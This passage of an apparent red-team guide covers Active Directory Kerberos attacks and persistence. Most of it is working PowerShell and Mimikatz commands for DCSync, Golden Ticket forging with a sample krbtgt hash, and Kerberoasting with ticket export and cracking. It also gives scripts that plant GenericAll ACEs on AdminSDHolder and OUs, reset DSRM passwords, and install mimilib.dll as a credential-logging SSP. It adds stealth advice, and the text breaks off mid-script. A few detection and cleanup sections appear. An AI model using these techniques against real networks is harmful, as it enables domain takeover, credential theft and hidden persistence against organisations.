Write-Host "   # Modify existing trust attributes" -ForegroundColor Gray

Write-Host "`nStealth Advantages:" -ForegroundColor Yellow
Write-Host "  - Uses legitimate user context" -ForegroundColor White
Write-Host "  - Harder to detect than Golden Ticket" -ForegroundColor White
Write-Host "  - Can blend in with normal user activity" -ForegroundColor White
Write-Host "  - Maintains user's original permissions" -ForegroundColor White
```

---

## 🔗 CROSS-REFERENCES

### **Related Kerberos Techniques**
- **Basic Kerberos Enumeration**: See [13_Kerberos_Basic_Enumeration.md](./23_Kerberos_Basic_Enumeration.md)
- **SPN Enumeration**: See [14_SPN_Enumeration_Techniques.md](./24_SPN_Enumeration_Techniques.md)
- **Delegation Abuse**: See [15_Kerberos_Delegation_Abuse.md](./25_Kerberos_Delegation_Abuse.md)

### **Related Enumeration Techniques**
- **User Enumeration**: See [02_User_Enumeration.md](./05_User_Enumeration.md)
- **Computer Enumeration**: See [03_Computer_Enumeration.md](./07_Computer_Enumeration.md)
- **Tool Setup**: See [01_Tool_Setup_Loading.md](./01_Tool_Setup_Loading.md)

### **Detection and Evasion**
- **Blue Team Detection**: See [11_Detection_Blue_Team.md](./32_Detection_Blue_Team.md)
- **Red Team Evasion**: See [12_Detection_Red_Team.md](./33_Detection_Red_Team.md)

---

## 🎯 CONCLUSION

**Kerberos Advanced Attacks** provides comprehensive techniques for sophisticated Kerberos exploitation. By mastering these techniques, you can:

- **Execute Golden Ticket attacks** for complete domain compromise
- **Perform Silver Ticket attacks** for service-specific access
- **Create Diamond Ticket attacks** for stealthy privilege escalation
- **Maintain persistent access** across the domain
- **Bypass advanced security controls** and monitoring

### **🚀 Key Success Factors**
1. **Hash Extraction**: Master DCSync and LSASS dump techniques
2. **Ticket Manipulation**: Understand ticket structure and modification
3. **Service Targeting**: Identify high-value services and SPNs
4. **Stealth Techniques**: Use legitimate contexts and minimize detection
5. **Tool Mastery**: Master Mimikatz, Rubeus, and PowerView for advanced attacks

---

**⚔️ Remember**: Advanced Kerberos attacks are like having the keys to the kingdom - you need to use them wisely and stealthily to avoid detection!**

---

## 📚 **NEXT STEPS**

After mastering Advanced Attacks, continue with:
- **Basic Kerberos**: See [13_Kerberos_Basic_Enumeration.md](./23_Kerberos_Basic_Enumeration.md)
- **SPN Enumeration**: See [14_SPN_Enumeration_Techniques.md](./24_SPN_Enumeration_Techniques.md)
- **Delegation Abuse**: See [15_Kerberos_Delegation_Abuse.md](./25_Kerberos_Delegation_Abuse.md)

## 🚀 ATTACK SCENARIOS

### **Scenario 1: Complete Domain Compromise via Golden Ticket**
1. **Basic Enumeration**: Map Kerberos infrastructure and identify high-value targets
2. **SPN Discovery**: Find service accounts with high-value SPNs
3. **Delegation Abuse**: Exploit unconstrained delegation for TGT capture
4. **Advanced Attacks**: Use Golden Ticket for complete domain access

### **Scenario 2: Service-Specific Lateral Movement**
1. **Basic Enumeration**: Understand domain structure and trust relationships
2. **SPN Discovery**: Identify target services and their associated accounts
3. **Delegation Abuse**: Use constrained delegation for service access
4. **Advanced Attacks**: Create Silver Tickets for specific service access

### **Scenario 3: Stealthy Privilege Escalation**
1. **Basic Enumeration**: Identify legitimate user contexts and permissions
2. **SPN Discovery**: Map service access patterns and privileges
3. **Delegation Abuse**: Understand delegation scope and limitations
4. **Advanced Attacks**: Create Diamond Ticket for stealthy escalation

---

## 🔐 COMPLETE ATTACK WORKFLOWS

### **1. 🎯 Complete Golden Ticket Attack Workflow**

#### **Step-by-Step Golden Ticket Execution**
```powershell
# Complete Golden Ticket Attack Workflow (CRITICAL MISSING CONTENT)
Write-Host "=== COMPLETE GOLDEN TICKET ATTACK WORKFLOW ===" -ForegroundColor Red

Write-Host "`n🎯 ATTACK OVERVIEW:" -ForegroundColor Yellow
Write-Host "Golden Ticket attack provides complete domain access by forging TGTs using KRBTGT hash." -ForegroundColor White

Write-Host "`n📋 PREREQUISITES:" -ForegroundColor Yellow
Write-Host "1. Domain admin access (via Over-Pass-the-Hash or other methods)" -ForegroundColor White
Write-Host "2. Access to domain controller" -ForegroundColor White
Write-Host "3. KRBTGT account NTLM hash" -ForegroundColor White

Write-Host "`n🚀 EXECUTION STEPS:" -ForegroundColor Yellow
Write-Host "1. Get a PowerShell session as a 'domain admin' using 'Over pass the hash' attack" -ForegroundColor White
Write-Host "2. Create a New-PSSession attaching to the 'domain controller'" -ForegroundColor White
Write-Host "3. Enter the new session using Enter-PSSession" -ForegroundColor White
Write-Host "4. Bypass the AMSI" -ForegroundColor White
Write-Host "5. Exit" -ForegroundColor White
Write-Host "6. Load Mimikatz.ps1 on the new session using Invoke-command" -ForegroundColor White
Write-Host "7. Enter the new session using Enter-PSSession again" -ForegroundColor White
Write-Host "8. Now we can execute mimikatz on the DC" -ForegroundColor White
Write-Host "9. Keep note of krbtgt hash" -ForegroundColor White
Write-Host "10. Now go to any 'non domain admin' account" -ForegroundColor White
Write-Host "11. Load Mimikatz.ps1" -ForegroundColor White
Write-Host "12. Now we can create a ticket using the DC krbtgt hash" -ForegroundColor White
Write-Host "13. Now we can access any service on the DC" -ForegroundColor White

Write-Host "`n🔧 COMPLETE GOLDEN TICKET COMMANDS:" -ForegroundColor Yellow

Write-Host "`nStep 1: DCSync for KRBTGT Hash" -ForegroundColor Cyan
Write-Host "Invoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\krbtgt\"'" -ForegroundColor White

Write-Host "`nStep 2: Create Golden Ticket" -ForegroundColor Cyan
Write-Host "Invoke-Mimikatz -Command '\"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /krbtgt:a9b30e5bO0dc865eadcea941le4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt\"'" -ForegroundColor White

Write-Host "`nStep 3: Verify Golden Ticket" -ForegroundColor Cyan
Write-Host "klist" -ForegroundColor White
Write-Host "Invoke-Mimikatz -Command '\"kerberos::list\"'" -ForegroundColor White

Write-Host "`nStep 4: Use Golden Ticket for Domain Access" -ForegroundColor Cyan
Write-Host "# Access domain controller" -ForegroundColor Gray
Write-Host "dir \\\\DC01.cybercorp.local\C$" -ForegroundColor White
Write-Host "# Access file shares" -ForegroundColor Gray
Write-Host "dir \\\\FILE01.cybercorp.local\Shares" -ForegroundColor White
Write-Host "# Execute DCSync attacks" -ForegroundColor Gray
Write-Host "Invoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\Administrator\"'" -ForegroundColor White

Write-Host "`n⚠️ IMPORTANT NOTES:" -ForegroundColor Red
Write-Host "- Golden Ticket provides complete domain access" -ForegroundColor White
Write-Host "- Ticket is valid until expiration time" -ForegroundColor White
Write-Host "- Can be used from any machine in the domain" -ForegroundColor White
Write-Host "- Highly detectable by security monitoring" -ForegroundColor White
```

#### **Golden Ticket Parameter Explanation**
```powershell
# Golden Ticket Parameter Breakdown
Write-Host "=== GOLDEN TICKET PARAMETER EXPLANATION ===" -ForegroundColor Green

$goldenTicketParams = @{
    "/User" = "Target username for impersonation (e.g., Administrator)"
    "/domain" = "Target domain name (e.g., cybercorp.local)"
    "/sid" = "Domain SID (e.g., S-1-5-21-1234567890-1234567890-1234567890)"
    "/krbtgt" = "KRBTGT account NTLM hash (obtained via DCSync)"
    "/id" = "User RID (e.g., 500 for Administrator)"
    "/groups" = "Additional group RIDs (e.g., 512 for Domain Admins)"
    "/startoffset" = "Ticket start time offset in minutes (0 = now)"
    "/endin" = "Ticket lifetime in minutes (e.g., 600 = 10 hours)"
    "/renewmax" = "Maximum renewal time in minutes (e.g., 10080 = 7 days)"
    "/ptt" = "Pass the ticket to current session"
}

Write-Host "`nGolden Ticket Parameters:" -ForegroundColor Yellow
foreach ($param in $goldenTicketParams.GetEnumerator()) {
    Write-Host "  $($param.Key): $($param.Value)" -ForegroundColor White
}

Write-Host "`n🔍 OBTAINING REQUIRED VALUES:" -ForegroundColor Yellow
Write-Host "1. Domain Name: Use Get-Domain or nltest /dsgetdc" -ForegroundColor White
Write-Host "2. Domain SID: Use Get-DomainSID or wmic useraccount get sid" -ForegroundColor White
Write-Host "3. KRBTGT Hash: Use DCSync attack on domain controller" -ForegroundColor White
Write-Host "4. User RID: Use Get-DomainUser or net user /domain" -ForegroundColor White
```

### **2. 🔥 Complete Kerberoasting Attack Workflow**

#### **Step-by-Step Kerberoasting Execution**
```powershell
# Complete Kerberoasting Attack Workflow (CRITICAL MISSING CONTENT)
Write-Host "=== COMPLETE KERBEROASTING ATTACK WORKFLOW ===" -ForegroundColor Red

Write-Host "`n🎯 ATTACK OVERVIEW:" -ForegroundColor Yellow
Write-Host "Kerberoasting extracts service account password hashes for offline cracking." -ForegroundColor White

Write-Host "`n📋 PREREQUISITES:" -ForegroundColor Yellow
Write-Host "1. Valid domain user credentials" -ForegroundColor White
Write-Host "2. Service accounts with SPNs configured" -ForegroundColor White
Write-Host "3. Access to request service tickets" -ForegroundColor White

Write-Host "`n🚀 EXECUTION STEPS:" -ForegroundColor Yellow
Write-Host "1. First find all the SPN accounts" -ForegroundColor White
Write-Host "2. Select SPN of a domain admin since we doing privilege escalation" -ForegroundColor White
Write-Host "3. Set the SPN as the argumentlist value and create a new object (request a TGS)" -ForegroundColor White
Write-Host "4. Export the all the tickets by mimikatz" -ForegroundColor White
Write-Host "5. Keep a note of the file name where the ticket is stored of that service" -ForegroundColor White
Write-Host "6. Crack the ticket" -ForegroundColor White

Write-Host "`n🔧 COMPLETE KERBEROASTING COMMANDS:" -ForegroundColor Yellow

Write-Host "`nStep 1: Find Service Accounts with SPNs" -ForegroundColor Cyan
Write-Host "# Find user accounts used as Service accounts" -ForegroundColor Gray
Write-Host "Get-NetUser -SPN" -ForegroundColor White
Write-Host "Get-NetUser -SPN -Verbose | select displayname,memberof" -ForegroundColor White

Write-Host "`nStep 2: Request Service Ticket (TGS)" -ForegroundColor Cyan
Write-Host "# Request TGS for specific service" -ForegroundColor Gray
Write-Host "Add-Type -AssemblyName System.IdentityModel" -ForegroundColor White
Write-Host "New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/computer.domain.local'" -ForegroundColor White

Write-Host "`nStep 3: Verify TGS Grant" -ForegroundColor Cyan
Write-Host "# Check if the TGS has been granted" -ForegroundColor Gray
Write-Host "klist" -ForegroundColor White

Write-Host "`nStep 4: Export Service Tickets" -ForegroundColor Cyan
Write-Host "# Export all the tickets" -ForegroundColor Gray
Write-Host "Invoke-Mimikatz -Command '\"kerberos::list /export\"'" -ForegroundColor White

Write-Host "`nStep 5: Crack Service Ticket" -ForegroundColor Cyan
Write-Host "# Crack with tgsrepcrack" -ForegroundColor Gray
Write-Host "python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-user1@MSSQLSvc~computer.domain.localDOMAIN.LOCAL.kirbi" -ForegroundColor White

Write-Host "`n⚠️ IMPORTANT NOTES:" -ForegroundColor Red
Write-Host "- Target high-value service accounts (Domain Admins, etc.)" -ForegroundColor White
Write-Host "- Service tickets are cached and can be extracted" -ForegroundColor White
Write-Host "- Use strong wordlists for effective cracking" -ForegroundColor White
Write-Host "- Monitor for detection by security tools" -ForegroundColor White
```

#### **Kerberoasting Target Selection**
```powershell
# Kerberoasting Target Selection Strategy
Write-Host "=== KERBEROASTING TARGET SELECTION STRATEGY ===" -ForegroundColor Green

Write-Host "`n🎯 HIGH-VALUE TARGETS:" -ForegroundColor Yellow
Write-Host "1. Domain Admin service accounts" -ForegroundColor Red
Write-Host "2. Enterprise Admin service accounts" -ForegroundColor Red
Write-Host "3. Schema Admin service accounts" -ForegroundColor Red
Write-Host "4. Service accounts with high privileges" -ForegroundColor Red

Write-Host "`n🔍 TARGET IDENTIFICATION:" -ForegroundColor Yellow
Write-Host "# Find high-value service accounts" -ForegroundColor Cyan
Write-Host "Get-DomainUser -SPN -Properties memberof,admincount | Where-Object { $_.admincount -eq 1 }" -ForegroundColor White

Write-Host "# Find service accounts in privileged groups" -ForegroundColor Cyan
Write-Host "Get-DomainUser -SPN -Properties memberof | Where-Object { $_.memberof -like '*Domain Admins*' }" -ForegroundColor White

Write-Host "# Find service accounts with specific SPNs" -ForegroundColor Cyan
Write-Host "Get-DomainUser -SPN -Properties serviceprincipalname | Where-Object { $_.serviceprincipalname -like '*CIFS*' -or $_.serviceprincipalname -like '*LDAP*' }" -ForegroundColor White

Write-Host "`n📊 TARGET PRIORITIZATION:" -ForegroundColor Yellow
Write-Host "Priority 1: Domain Admin service accounts" -ForegroundColor Red
Write-Host "Priority 2: Enterprise Admin service accounts" -ForegroundColor Red
Write-Host "Priority 3: High-privilege service accounts" -ForegroundColor Red
Write-Host "Priority 4: Standard service accounts" -ForegroundColor Yellow
```

---

## At‑a‑Glance

### Command Quick‑Reference
| Attack | Tool | Example | Notes |
| - | - | - | - |
| Golden | Mimikatz | kerberos::golden /user:... /krbtgt:... /ptt | Domain‑wide
| Silver | Mimikatz | kerberos::golden /service:CIFS /rc4:<hash> /ptt | Service‑scoped
| Diamond | Mimikatz | modify legit TGT using krbtgt | Stealthier
| S4U chain | Rubeus | Rubeus.exe s4u /user:websvc ... | CD/RBCD

### Pivot Matrix
| Precursor | Attack | Goal |
| - | - | - |
| KRBTGT hash | Golden | Domain compromise
| Service acct hash | Silver | Specific service access
| Legit TGT + krbtgt | Diamond | Stealth escalation
| RBCD write | S4U2Self/Proxy | File/DC access

## Stealth & Loading
Use [01_Tool_Setup_Loading.md](./01_Tool_Setup_Loading.md) for stealth session and prep. Continue here with advanced attack execution only.

## CyberCorp Persona
- Persona: Omar Haddad, Red Team Lead. Objective: post‑SPN/Delegation phase escalation with minimal signals.

## Attack Progression (unique)


## Lab vs Production
- Stealth: prefer Diamond/S4U where feasible; avoid broad golden usage; use legit usernames; time within business hours.
- Lab: full workflows, ticket param experimentation, correlation with detection rules.

## Detection/OPSEC
- Ticket anomalies: long lifetimes, unusual group SIDs, mismatch user/service pairs. Verify event coverage (4768/4769/4771) before executing.

## Cleanup
```powershell
klist purge; Remove-Variable goldenTicketParams -ErrorAction SilentlyContinue
```

## 🎭 SD Persistence & DSRM Admin Logon

### **Security Descriptor (SD) Persistence**

#### **What is SD Persistence?**
**Security Descriptor Persistence** involves modifying the security descriptors of Active Directory objects to maintain access even after initial compromise is detected and cleaned up. This technique embeds malicious access control entries (ACEs) into the object's security descriptor.

#### **SD Persistence Targets**
- **High-Value Groups**: Domain Admins, Enterprise Admins, Schema Admins
- **Critical OUs**: IT, Finance, Executive organizational units
- **Service Accounts**: Accounts with SPNs and high privileges
- **AdminSDHolder**: Template that affects all protected objects

### **SD Persistence Implementation**

#### **1. SD Persistence via Group Modification**
```powershell
# Objective: Add malicious user to high-value groups via SD modification
# Impact: Persistent access to privileged group membership

Write-Host "=== SD PERSISTENCE VIA GROUP MODIFICATION ===" -ForegroundColor Red

# Step 1: Identify target group and malicious user
$targetGroup = "Domain Admins"
$maliciousUser = "evil_user"
$maliciousSID = (Get-DomainUser -Identity $maliciousUser).objectsid

# Step 2: Check current group membership
$currentMembers = Get-DomainGroupMember -Identity $targetGroup -Recurse
$isAlreadyMember = $currentMembers | Where-Object {$_.samaccountname -eq $maliciousUser}

if($isAlreadyMember) {
    Write-Host "User is already member of $targetGroup" -ForegroundColor Yellow
} else {
    Write-Host "Adding malicious user to $targetGroup via SD modification" -ForegroundColor Green
    
    # Step 3: Add user to group via SD modification
    $group = Get-DomainGroup -Identity $targetGroup
    $group.member += $maliciousUser
    Set-DomainObject -Identity $group.distinguishedname -Set @{member=$group.member}
    
    Write-Host "Successfully added $maliciousUser to $targetGroup" -ForegroundColor Green
}
```

#### **2. SD Persistence via OU Delegation**
```powershell
# Objective: Grant malicious user control over entire OU via SD modification
# Impact: Control over all objects within the OU

Write-Host "=== SD PERSISTENCE VIA OU DELEGATION ===" -ForegroundColor Red

# Step 1: Identify target OU and malicious user
$targetOU = "OU=IT,DC=corp,DC=local"
$maliciousUser = "evil_user"
$maliciousSID = (Get-DomainUser -Identity $maliciousUser).objectsid

# Step 2: Check current OU permissions
$ouACLs = Get-DomainObjectAcl -Identity $targetOU -ResolveGUIDs
$currentPermissions = $ouACLs | Where-Object {$_.IdentityReference -like "*\$maliciousUser"}

if($currentPermissions) {
    Write-Host "User already has permissions on $targetOU" -ForegroundColor Yellow
    $currentPermissions | Format-Table IdentityReference, ActiveDirectoryRights, AceType
} else {
    Write-Host "Granting malicious user control over $targetOU" -ForegroundColor Green
    
    # Step 3: Grant GenericAll permissions via SD modification
    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $maliciousSID,
        "GenericAll",
        "Allow",
        "All",
        "None"
    )
    
    $acl = Get-Acl -Path "AD:$targetOU"
    $acl.AddAccessRule($ace)
    Set-Acl -Path "AD:$targetOU" -AclObject $acl
    
    Write-Host "Successfully granted GenericAll permissions on $targetOU" -ForegroundColor Green
}
```

#### **3. SD Persistence via AdminSDHolder Modification**
```powershell
# Objective: Modify AdminSDHolder to affect all protected objects
# Impact: Persistent access to all high-privilege accounts and groups

Write-Host "=== SD PERSISTENCE VIA ADMINSDHOLDER MODIFICATION ===" -ForegroundColor Red

# Step 1: Verify access to AdminSDHolder
$adminSDHolder = "CN=AdminSDHolder,CN=System,DC=corp,DC=local"
$adminSDHolderACLs = Get-DomainObjectAcl -Identity $adminSDHolder -ResolveGUIDs
$currentUser = $env:USERNAME

$hasWriteAccess = $adminSDHolderACLs | Where-Object {
    $_.IdentityReference -like "*\$currentUser" -and
    ($_.ActiveDirectoryRights -like "*WriteDACL*" -or $_.ActiveDirectoryRights -like "*GenericAll*")
}

if($hasWriteAccess) {
    Write-Host "User has write access to AdminSDHolder - proceeding with SD persistence" -ForegroundColor Green
    
    # Step 2: Add malicious ACE to AdminSDHolder
    $maliciousUser = "evil_user"
    $maliciousSID = (Get-DomainUser -Identity $maliciousUser).objectsid
    
    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $maliciousSID,
        "GenericAll",
        "Allow",
        "All",
        "None"
    )
    
    # Step 3: Apply to AdminSDHolder
    $acl = Get-Acl -Path "AD:$adminSDHolder"
    $acl.AddAccessRule($ace)
    Set-Acl -Path "AD:$adminSDHolder" -AclObject $acl
    
    Write-Host "Successfully modified AdminSDHolder for SD persistence" -ForegroundColor Green
    Write-Host "Malicious user now has persistent access to all protected objects" -ForegroundColor Red
    
} else {
    Write-Host "User does not have write access to AdminSDHolder" -ForegroundColor Red
}
```

### **DSRM Admin Logon**

#### **What is DSRM?**
**Directory Services Restore Mode (DSRM)** is a special boot mode for Domain Controllers that allows administrators to restore Active Directory from backup or repair corrupted databases. DSRM uses a local administrator account that exists independently of Active Directory.

#### **DSRM Admin Logon Attack**
```powershell
# Objective: Use DSRM admin credentials to access domain controller
# Impact: Direct access to domain controller and Active Directory database

Write-Host "=== DSRM ADMIN LOGON ATTACK ===" -ForegroundColor Red

# Step 1: Check if DSRM password is set
# This requires physical or console access to the domain controller
Write-Host "DSRM attack requires physical/console access to domain controller" -ForegroundColor Yellow
Write-Host "Cannot be performed remotely via PowerShell" -ForegroundColor Red

# Step 2: DSRM password reset (if we have domain admin access)
$dcName = "DC01.corp.local"
$dsrmPassword = "NewDSRMPassword123!"

try {
    # Reset DSRM password
    $dc = Get-ADDomainController -Identity $dcName
    Set-ADAccountPassword -Identity $dc.Name -Reset -NewPassword (ConvertTo-SecureString -AsPlainText $dsrmPassword -Force)
    
    Write-Host "Successfully reset DSRM password for $dcName" -ForegroundColor Green
    Write-Host "New DSRM password: $dsrmPassword" -ForegroundColor Red
    
} catch {
    Write-Host "Failed to reset DSRM password: $($_.Exception.Message)" -ForegroundColor Red
}
```

#### **DSRM Admin Logon via Mimikatz**
```powershell
# Alternative: Use Mimikatz to interact with DSRM
# This requires local access to the domain controller

Write-Host "=== DSRM ADMIN LOGON VIA MIMIKATZ ===" -ForegroundColor Red

# Step 1: Check if we're on a domain controller
$isDC = (Get-WmiObject -Class Win32_ComputerSystem).DomainRole
if($isDC -eq 5) {
    Write-Host "Running on Domain Controller - DSRM attack possible" -ForegroundColor Green
    
    # Step 2: Attempt DSRM logon via Mimikatz
    Write-Host "Attempting DSRM logon..." -ForegroundColor Yellow
    
    # Note: This requires the DSRM password to be known
    # Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
    
    Write-Host "DSRM logon requires known DSRM password" -ForegroundColor Yellow
    Write-Host "Use password reset method above if domain admin access available" -ForegroundColor Yellow
    
} else {
    Write-Host "Not running on Domain Controller - DSRM attack not possible" -ForegroundColor Red
}
```

### **Advanced SD Persistence Techniques**

#### **1. SD Persistence via Schema Extension**
```powershell
# Objective: Extend schema to include malicious attributes for persistence
# Impact: Persistent access through custom attributes

Write-Host "=== SD PERSISTENCE VIA SCHEMA EXTENSION ===" -ForegroundColor Red

# Step 1: Check schema modification rights
$schemaContainer = "CN=Schema,CN=Configuration,DC=corp,DC=local"
$schemaACLs = Get-DomainObjectAcl -Identity $schemaContainer -ResolveGUIDs
$currentUser = $env:USERNAME

$hasSchemaAccess = $schemaACLs | Where-Object {
    $_.IdentityReference -like "*\$currentUser" -and
    ($_.ActiveDirectoryRights -like "*WriteProperty*" -or $_.ActiveDirectoryRights -like "*GenericAll*")
}

if($hasSchemaAccess) {
    Write-Host "User has schema modification rights - proceeding with SD persistence" -ForegroundColor Green
    
    # Step 2: Create custom attribute for persistence
    $customAttributeName = "msDS-PersistenceToken"
    $customAttributeValue = "evil_persistence_$(Get-Random -Minimum 1000 -Maximum 9999)"
    
    Write-Host "Creating custom attribute: $customAttributeName" -ForegroundColor Yellow
    Write-Host "This is a complex operation requiring careful schema planning" -ForegroundColor Yellow
    
    # Note: Actual schema extension requires careful planning and testing
    Write-Host "Schema extension not implemented - requires detailed schema planning" -ForegroundColor Yellow
    
} else {
    Write-Host "User does not have schema modification rights" -ForegroundColor Red
}
```

#### **2. SD Persistence via Trust Modification**
```powershell
# Objective: Modify trust relationships for persistence
# Impact: Persistent access through trust abuse

Write-Host "=== SD PERSISTENCE VIA TRUST MODIFICATION ===" -ForegroundColor Red

# Step 1: Enumerate existing trusts
$trusts = Get-DomainTrust -Properties *
$externalTrusts = $trusts | Where-Object {$_.TrustType -eq "External"}

Write-Host "Found $($externalTrusts.Count) external trusts" -ForegroundColor Yellow

foreach($trust in $externalTrusts) {
    Write-Host "Trust: $($trust.SourceName) -> $($trust.TargetName)" -ForegroundColor Cyan
    Write-Host "  Trust Direction: $($trust.TrustDirection)" -ForegroundColor White
    Write-Host "  Trust Attributes: $($trust.TrustAttributes)" -ForegroundColor White
    
    # Step 2: Check trust modification rights
    $trustACLs = Get-DomainObjectAcl -Identity $trust.SourceName -ResolveGUIDs
    $currentUser = $env:USERNAME
    
    $hasTrustAccess = $trustACLs | Where-Object {
        $_.IdentityReference -like "*\$currentUser" -and
        ($_.ActiveDirectoryRights -like "*WriteProperty*" -or $_.ActiveDirectoryRights -like "*GenericAll*")
    }
    
    if($hasTrustAccess) {
        Write-Host "  User has trust modification rights" -ForegroundColor Green
        Write-Host "  Trust modification possible for persistence" -ForegroundColor Red
    } else {
        Write-Host "  User does not have trust modification rights" -ForegroundColor Red
    }
}
```

### **SD Persistence Detection and OPSEC**

#### **SD Persistence Detection**
```powershell
# Monitor for SD persistence attempts
# Event IDs: 5136 (Directory Service Changes), 4662 (Object Access)

Write-Host "=== SD PERSISTENCE DETECTION ===" -ForegroundColor Yellow

# Check for recent SD modifications
$highValueObjects = @("Domain Admins", "Enterprise Admins", "AdminSDHolder")
$recentModifications = @()

foreach($obj in $highValueObjects) {
    try {
        $object = Get-DomainObject -Identity $obj -Properties whenChanged,whenCreated
        $recentModifications += [PSCustomObject]@{
            Object = $obj
            LastModified = $object.whenChanged
            Created = $object.whenCreated
            DaysSinceModification = ((Get-Date) - $object.whenChanged).Days
        }
    } catch {
        Write-Warning "Failed to analyze $obj`: $($_.Exception.Message)"
    }
}

$recentModifications | Sort-Object DaysSinceModification | Format-Table

# Check for unusual ACEs
Write-Host "`nChecking for unusual ACEs on high-value objects..." -ForegroundColor Yellow
foreach($obj in $highValueObjects) {
    try {
        $acls = Get-DomainObjectAcl -SamAccountName $obj -ResolveGUIDs
        $unusualACEs = $acls | Where-Object {
            $_.IdentityReference -notlike "*\Administrator" -and
            $_.IdentityReference -notlike "*\Domain Admins" -and
            $_.IdentityReference -notlike "*\SYSTEM"
        }
        
        if($unusualACEs) {
            Write-Host "Unusual ACEs found on $obj:" -ForegroundColor Red
            $unusualACEs | Format-Table IdentityReference, ActiveDirectoryRights, AceType
        }
    } catch {
        Write-Warning "Failed to analyze ACLs for $obj`: $($_.Exception.Message)"
    }
}
```

#### **DSRM Activity Detection**
```powershell
# Monitor for DSRM activity
# Event IDs: 4624 (Logon), 4625 (Logon Failure)

Write-Host "=== DSRM ACTIVITY DETECTION ===" -ForegroundColor Yellow

# Check for DSRM logon attempts
Write-Host "Monitor for Event ID 4624 with Logon Type 2 (Interactive)" -ForegroundColor Yellow
Write-Host "Look for logons to accounts with DSRM privileges" -ForegroundColor Yellow
Write-Host "Monitor for unusual logon patterns on domain controllers" -ForegroundColor Yellow

# Check DSRM password age
$dcs = Get-ADDomainController -Filter *
foreach($dc in $dcs) {
    Write-Host "DC: $($dc.Name)" -ForegroundColor Cyan
    Write-Host "  Last DSRM password change: Check manually" -ForegroundColor Yellow
    Write-Host "  DSRM password policy: Check manually" -ForegroundColor Yellow
}
```

### **SD Persistence Cleanup**

#### **SD Persistence Cleanup**
```powershell
# Remove SD persistence mechanisms
Write-Host "=== SD PERSISTENCE CLEANUP ===" -ForegroundColor Green

# Step 1: Remove malicious ACEs from AdminSDHolder
$adminSDHolder = "CN=AdminSDHolder,CN=System,DC=corp,DC=local"
$acl = Get-Acl -Path "AD:$adminSDHolder"

$maliciousUser = "evil_user"
$maliciousACEs = $acl.Access | Where-Object {$_.IdentityReference -like "*\$maliciousUser"}

foreach($ace in $maliciousACEs) {
    $acl.RemoveAccessRule($ace)
    Write-Host "Removed malicious ACE for $($ace.IdentityReference)" -ForegroundColor Green
}

Set-Acl -Path "AD:$adminSDHolder" -AclObject $acl

# Step 2: Remove malicious user from high-value groups
$highValueGroups = @("Domain Admins", "Enterprise Admins")
foreach($group in $highValueGroups) {
    try {
        Remove-ADGroupMember -Identity $group -Members $maliciousUser -Confirm:$false
        Write-Host "Removed $maliciousUser from $group" -ForegroundColor Green
    } catch {
        Write-Warning "Failed to remove $maliciousUser from $group`: $($_.Exception.Message)"
    }
}

# Step 3: Remove malicious ACEs from OUs
$targetOUs = @("OU=IT,DC=corp,DC=local", "OU=Finance,DC=corp,DC=local")
foreach($ou in $targetOUs) {
    try {
        $acl = Get-Acl -Path "AD:$ou"
        $maliciousACEs = $acl.Access | Where-Object {$_.IdentityReference -like "*\$maliciousUser"}
        
        foreach($ace in $maliciousACEs) {
            $acl.RemoveAccessRule($ace)
            Write-Host "Removed malicious ACE from $ou" -ForegroundColor Green
        }
        
        Set-Acl -Path "AD:$ou" -AclObject $acl
    } catch {
        Write-Warning "Failed to clean up $ou`: $($_.Exception.Message)"
    }
}

Write-Host "SD persistence cleanup completed" -ForegroundColor Green
```

#### **DSRM Cleanup**
```powershell
# DSRM cleanup
Write-Host "=== DSRM CLEANUP ===" -ForegroundColor Green

# Step 1: Reset DSRM password to secure value
$dcName = "DC01.corp.local"
$securePassword = "SecureDSRMPassword123!"

try {
    $dc = Get-ADDomainController -Identity $dcName
    Set-ADAccountPassword -Identity $dc.Name -Reset -NewPassword (ConvertTo-SecureString -AsPlainText $securePassword -Force)
    
    Write-Host "Successfully reset DSRM password for $dcName" -ForegroundColor Green
    Write-Host "New secure DSRM password set" -ForegroundColor Green
    
} catch {
    Write-Host "Failed to reset DSRM password: $($_.Exception.Message)" -ForegroundColor Red
}

# Step 2: Document DSRM password securely
Write-Host "DSRM password has been reset to secure value" -ForegroundColor Green
Write-Host "Ensure password is documented securely and shared with authorized personnel only" -ForegroundColor Yellow
```

## 🎭 Custom SSP (memssp) Implementation

### **What is Custom SSP (memssp)?**
**Custom Security Support Provider (SSP)** is a technique that injects malicious code into the Local Security Authority Subsystem Service (LSASS) process to capture credentials in real-time. The **memssp** technique specifically uses Mimikatz to inject a custom SSP that logs all local logons, service account passwords, and machine account passwords in clear text.

#### **SSP Fundamentals**
**Security Support Providers** are DLLs that provide authentication methods for applications. Microsoft's default SSPs include:
- **NTLM**: Windows NT LAN Manager authentication
- **Kerberos**: Kerberos v5 authentication protocol
- **WDigest**: Digest authentication
- **CredSSP**: Credential Security Support Provider

### **Custom SSP Implementation Methods**

#### **Method 1: Mimilib.dll File-Based SSP**
```powershell
# Objective: Drop mimilib.dll to system32 and register it as an SSP
# Impact: All local logons are logged to C:\Windows\system32\mimilsa.log

Write-Host "=== CUSTOM SSP VIA MIMILIB.DLL ===" -ForegroundColor Red

# Step 1: Check if mimilib.dll exists in current directory
$mimilibPath = ".\mimilib.dll"
if(Test-Path $mimilibPath) {
    Write-Host "Found mimilib.dll - proceeding with SSP installation" -ForegroundColor Green
    
    # Step 2: Copy mimilib.dll to system32 (requires admin privileges)
    $system32Path = "$env:SystemRoot\System32\mimilib.dll"
    try {
        Copy-Item -Path $mimilibPath -Destination $system32Path -Force
        Write-Host "Successfully copied mimilib.dll to System32" -ForegroundColor Green
        
        # Step 3: Add mimilib to Security Packages registry key
        $securityPackagesPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig"
        $currentPackages = Get-ItemProperty -Path $securityPackagesPath -Name "Security Packages" -ErrorAction SilentlyContinue
        
        if($currentPackages) {
            $packages = $currentPackages."Security Packages"
            if($packages -notcontains "mimilib") {
                $packages += "mimilib"
